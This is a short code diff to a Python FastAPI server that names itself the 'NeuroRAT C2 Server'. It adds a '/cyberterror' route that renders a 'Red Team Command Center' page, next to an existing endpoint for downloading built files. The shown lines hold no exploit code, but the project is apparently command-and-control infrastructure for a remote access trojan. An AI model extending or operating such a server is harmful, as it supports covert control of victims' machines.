@@ -2046,6 +2046,14 @@ async def download_built_file(file: str):
         return JSONResponse({"error": "Файл не найден"}, status_code=404)
     return FileResponse(file_path, filename=os.path.basename(file_path))
 
+@app.get("/cyberterror", response_class=HTMLResponse)
+async def get_cyberterror(request: Request):
+    """Red Team Command Center — Matrix/Mr. Robot киберпанк UI"""
+    return templates.TemplateResponse(
+        "cyberterror.html",
+        {"request": request}
+    )
+
 if __name__ == "__main__":
     # Обработка аргументов командной строки
     parser = argparse.ArgumentParser(description="NeuroRAT C2 Server")
